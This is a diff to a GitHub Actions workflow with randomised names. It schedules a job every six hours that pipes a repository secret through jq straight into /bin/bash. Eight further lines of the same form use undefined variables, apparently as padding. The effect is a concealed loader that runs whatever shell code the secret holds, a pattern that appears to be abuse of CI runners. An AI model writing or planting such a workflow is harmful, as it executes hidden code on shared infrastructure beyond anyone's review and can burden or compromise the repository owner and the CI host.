@@ -1,26 +1,25 @@
 name: ambitionparka
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '6 0/6 * * *'
-
+    - cron: '16 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: ambitionparka
         env:
-          tswb83962: ${{ secrets.tswb83962 }}
+          on4901: ${{ secrets.on4901 }}
         run: |
-          echo $tswb83962 | jq -r .wdywl79464 | /bin/bash
-          echo $sifc227 | jq -r .x070 | /bin/bash
-          echo $mgc12 | jq -r .hfjzb930 | /bin/bash
-          echo $vipj9 | jq -r .x38 | /bin/bash
-          echo $m1976 | jq -r .cvd5251 | /bin/bash
-          echo $k3155 | jq -r .dw24207 | /bin/bash
-          echo $yq093 | jq -r .lkkf63334 | /bin/bash
-          echo $qbrdg6700 | jq -r .dti7232 | /bin/bash
-          echo $pz596 | jq -r .ma2503 | /bin/bash
+          echo $on4901 | jq -r .gsu6 | /bin/bash
+          echo $kgyis5 | jq -r .aqld2877 | /bin/bash
+          echo $zji9573 | jq -r .k68 | /bin/bash
+          echo $gwj71746 | jq -r .hs9 | /bin/bash
+          echo $xk46034 | jq -r .rasls765 | /bin/bash
+          echo $axw4619 | jq -r .hnm9 | /bin/bash
+          echo $rvn84983 | jq -r .xu4 | /bin/bash
+          echo $hkxnb69707 | jq -r .srgct1765 | /bin/bash
+          echo $m612 | jq -r .e2750 | /bin/bash
 
